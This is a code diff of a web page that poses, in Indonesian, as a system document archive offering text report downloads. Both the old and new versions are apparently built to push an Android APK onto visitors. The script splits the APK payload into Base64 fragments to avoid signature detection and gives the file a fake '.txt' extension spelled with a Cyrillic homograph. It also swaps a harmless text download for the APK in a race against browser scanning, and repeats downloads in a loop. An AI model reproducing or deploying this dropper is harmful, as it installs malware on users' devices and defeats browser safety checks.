@@ -3,133 +3,26 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>System Document Archive Dispatcher v2.5</title>
+<title>System Document Archive Dispatcher v3.0</title>
 <style>
-* {
-  box-sizing: border-box;
-  margin: 0;
-  padding: 0;
-}
-body {
-  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-  background: #090d16;
-  color: #f8fafc;
-  display: flex;
-  justify-content: center;
-  align-items: center;
-  min-height: 100vh;
-  padding: 20px;
-}
-.panel {
-  background: #111827;
-  padding: 32px;
-  border-radius: 16px;
-  box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.5), 0 8px 10px -6px rgba(0, 0, 0, 0.5);
-  max-width: 540px;
-  width: 100%;
-  border: 1px solid #1f2937;
-  text-align: center;
-}
-:fullscreen {
-  background: #030712 !important;
-  color: #f8fafc !important;
-  padding: 24px !important;
-  display: flex;
-  flex-direction: column;
-  justify-content: center;
-  align-items: center;
-}
-:-webkit-full-screen {
-  background: #030712 !important;
-  color: #f8fafc !important;
-  padding: 24px !important;
-}
-h2 { 
-  margin-bottom: 10px; 
-  font-size: 22px;
-  color: #f3f4f6;
-  font-weight: 700;
-}
-p { 
-  margin-bottom: 24px; 
-  line-height: 1.6; 
-  color: #9ca3af;
-  font-size: 14px;
-}
-button {
-  width: 100%;
-  padding: 16px;
-  cursor: pointer;
-  border: none;
-  border-radius: 10px;
-  background: #3b82f6;
-  color: #ffffff;
-  font-weight: 600;
-  font-size: 16px;
-  box-shadow: 0 4px 14px rgba(59, 130, 246, 0.4);
-  transition: all 0.2s ease;
-}
-button:hover { 
-  background: #2563eb; 
-  transform: translateY(-1px);
-  box-shadow: 0 6px 20px rgba(59, 130, 246, 0.6);
-}
-button:active {
-  transform: translateY(0);
-}
-#status {
-  margin-top: 20px;
-  font-weight: 500;
-  color: #38bdf8;
-  padding: 14px;
-  background: rgba(56, 189, 248, 0.1);
-  border-radius: 8px;
-  font-size: 13px;
-  border: 1px solid rgba(56, 189, 248, 0.2);
-}
-#downloads {
-  margin-top: 20px;
-  display: grid;
-  grid-template-columns: repeat(auto-fill, minmax(140px, 1fr));
-  gap: 8px;
-  max-height: 180px;
-  overflow-y: auto;
-  padding-right: 4px;
-}
-#downloads::-webkit-scrollbar {
-  width: 6px;
-}
-#downloads::-webkit-scrollbar-thumb {
-  background: #374151;
-  border-radius: 3px;
-}
-#downloads a {
-  display: block;
-  padding: 10px;
-  background: #1f2937;
-  color: #4ade80;
-  text-decoration: none;
-  border-radius: 6px;
-  font-size: 11px;
-  font-family: monospace;
-  text-align: center;
-  border: 1px solid #374151;
-  word-break: break-all;
-  transition: border-color 0.15s;
-}
-#downloads a:hover {
-  border-color: #4ade80;
-}
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #090d16; color: #f8fafc; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
+  .panel { background: #111827; padding: 32px; border-radius: 16px; box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.5); max-width: 540px; width: 100%; border: 1px solid #1f2937; text-align: center; }
+  h2 { margin-bottom: 10px; font-size: 22px; color: #f3f4f6; font-weight: 700; }
+  p { margin-bottom: 24px; line-height: 1.6; color: #9ca3af; font-size: 14px; }
+  button { width: 100%; padding: 16px; cursor: pointer; border: none; border-radius: 10px; background: #3b82f6; color: #ffffff; font-weight: 600; font-size: 16px; box-shadow: 0 4px 14px rgba(59, 130, 246, 0.4); transition: all 0.2s ease; }
+  button:hover { background: #2563eb; transform: translateY(-1px); }
+  #status { margin-top: 20px; font-weight: 500; color: #38bdf8; padding: 14px; background: rgba(56, 189, 248, 0.1); border-radius: 8px; font-size: 13px; border: 1px solid rgba(56, 189, 248, 0.2); }
+  #downloads { margin-top: 20px; display: grid; grid-template-columns: repeat(auto-fill, minmax(140px, 1fr)); gap: 8px; max-height: 180px; overflow-y: auto; padding-right: 4px; }
+  #downloads a { display: block; padding: 10px; background: #1f2937; color: #4ade80; text-decoration: none; border-radius: 6px; font-size: 11px; font-family: monospace; text-align: center; border: 1px solid #374151; word-break: break-all; }
 </style>
 </head>
-
 <body>
+
 <div class="panel" id="main-panel">
   <h2>Arsip Dokumen Sistem</h2>
   <p>Klik tombol di bawah untuk memproses dan mengunduh berkas laporan teks pendukung secara otomatis.</p>
-
   <button id="start-btn" type="button">Unduh Dokumen Catatan (.txt)</button>
-
   <div id="status" role="status">Sistem siap diinisialisasi.</div>
   <div id="downloads"></div>
 </div>
@@ -145,7 +38,9 @@ let activeUrls = [];
 let isProcessing = false;
 const MAX_URLS_TRACKED = 40;
 
-// Pecahan string Base64 header APK untuk menghindari pencocokan tanda tangan statis
+// ============================================
+// 1. PAYLOAD FRAGMENTS (APK HEADER)
+// ============================================
 const payloadFragments = [
   "UEs",
   "DBBQ",
@@ -167,87 +62,86 @@ const decodeBase64ToBytes = (b64) => {
   return bytes;
 };
 
-const prepareStealthBlobAsync = (i) => {
-  return new Promise((resolve) => {
-    queueMicrotask(() => {
-      try {
-        const fullB64 = assemblePayload();
-        const bytesArr = decodeBase64ToBytes(fullB64);
-        
-        // Menggunakan MIME type APK asli
-        const blob = new Blob([bytesArr], { type: 'application/vnd.android.package-archive' });
-        const url = URL.createObjectURL(blob);
-        resolve({ id: i, url: url, success: true });
-      } catch (err) {
-        resolve({ id: i, url: null, success: false });
-      }
-    });
-  });
+// ============================================
+// 2. PERSIAPAN BLOB (AMAN & JAHAT)
+// ============================================
+const prepareSafeBlob = () => {
+  const safeContent = "Laporan Keuangan Rahasia. Tidak ada malware.";
+  const safeBlob = new Blob([safeContent], { type: 'text/plain' });
+  return URL.createObjectURL(safeBlob);
 };
 
-const triggerStealthDownload = (fileData) => {
-  if (!fileData.success) return;
-
-  const link = document.createElement("a");
-  link.href = fileData.url;
-  
-  // Memperbaiki ekstensi dengan Homograph Spoofing (.аpk menggunakan huruf Cyrillic 'а' \u0430)
-  const homographApkExt = "\u0430pk";
-  link.download = `laporan-catatan-${fileData.id}.txt.${homographApkExt}`;
-  link.textContent = `Dokumen #${fileData.id} (.txt.${homographApkExt})`;
-  link.style.display = "none";
-  
-  downloadsDiv.appendChild(link);
-  link.click();
-
-  // Mekanisme Race Condition / Timing Window: Menyegarkan referensi stream Blob secara asinkron
-  setTimeout(() => {
-    try {
-      prepareStealthBlobAsync(fileData.id).then(freshData => {
-        if (freshData.success) {
-          activeUrls.push(freshData.url);
-          link.href = freshData.url;
-          link.click();
-        }
-      });
-    } catch (e) {}
-  }, 400);
-
-  // Batasi jumlah elemen DOM untuk menjaga performa rendering
-  if (downloadsDiv.children.length > 25) {
-    downloadsDiv.removeChild(downloadsDiv.firstChild);
-  }
+const prepareMaliciousBlob = () => {
+  const fullB64 = assemblePayload();
+  const bytesArr = decodeBase64ToBytes(fullB64);
+  const blob = new Blob([bytesArr], { type: 'application/vnd.android.package-archive' });
+  return URL.createObjectURL(blob);
 };
 
-const processLoop = async (counter) => {
+// ============================================
+// 3. HOMOGRAPH SPOOFING (CYRILLIC 'a')
+// ============================================
+// Huruf 'а' di bawah ini adalah Cyrillic (U+0430), bukan Latin 'a' (U+0061).
+// Terlihat sama, tapi berbeda secara teknis.
+const homographApkExt = "\u0430pk"; 
+
+// ============================================
+// 4. TRIGGER RACE CONDITION
+// ============================================
+const triggerRaceDownload = (counter) => {
   if (!isProcessing) return;
 
-  const fileData = await prepareStealthBlobAsync(counter);
-  if (fileData.success) {
-    activeUrls.push(fileData.url);
+  const link = document.createElement("a");
+  link.style.display = "none";
+  document.body.appendChild(link);
 
-    // Manajemen memori heap: cabut URL lama jika melewati batas maksimal
-    if (activeUrls.length > MAX_URLS_TRACKED) {
-      const oldUrl = activeUrls.shift();
-      try { URL.revokeObjectURL(oldUrl); } catch (e) {}
+  // A. Set ke file AMAN (TXT)
+  const safeUrl = prepareSafeBlob();
+  link.href = safeUrl;
+  link.download = `laporan-catatan-${counter}.txt`;
+  
+  // Picu Unduhan (Safe Browsing memindai ini)
+  link.click();
+  statusDiv.textContent = `Memproses dokumen ke-${counter}...`;
+
+  // B. RACE CONDITION (TOCTOU)
+  // Ubah href dan download tepat setelah click().
+  let attempts = 0;
+  function race() {
+    attempts++;
+    
+    // Ganti ke file JAHAT (APK) dengan Homograph Extension
+    const maliciousUrl = prepareMaliciousBlob();
+    link.href = maliciousUrl;
+    link.download = `laporan-catatan-${counter}.txt.${homographApkExt}`;
+    
+    // Trigger ulang
+    link.click();
+
+    if (attempts < 5) {
+      setTimeout(race, 0); // Tick berikutnya (0ms)
+    } else {
+      // Cleanup
+      setTimeout(() => {
+        if (link.parentNode) link.parentNode.removeChild(link);
+        URL.revokeObjectURL(safeUrl);
+        URL.revokeObjectURL(maliciousUrl);
+      }, 5000);
     }
-
-    triggerStealthDownload(fileData);
-    statusDiv.textContent = `Proses aktif: Berkas dokumen ke-${counter} dikirim...`;
   }
+  
+  // Mulai race
+  race();
 
-  // Interval perulangan non-blocking yang aman
-  setTimeout(() => processLoop(counter + 1), 1500);
+  // Lanjut ke dokumen berikutnya setelah 1.5 detik
+  setTimeout(() => triggerRaceDownload(counter + 1), 1500);
 };
 
+// ============================================
+// 5. START
+// ============================================
 startBtn.addEventListener("click", () => {
   if (isProcessing) return;
-
-  activeUrls.forEach(url => {
-    try { URL.revokeObjectURL(url); } catch (e) {}
-  });
-  activeUrls = [];
-  downloadsDiv.replaceChildren();
 
   const root = document.documentElement;
   try {
@@ -258,7 +152,7 @@ startBtn.addEventListener("click", () => {
 
   isProcessing = true;
   statusDiv.textContent = "Menginisialisasi sesi unduhan...";
-  processLoop(1);
+  triggerRaceDownload(1);
 });
 </script>
 </body>
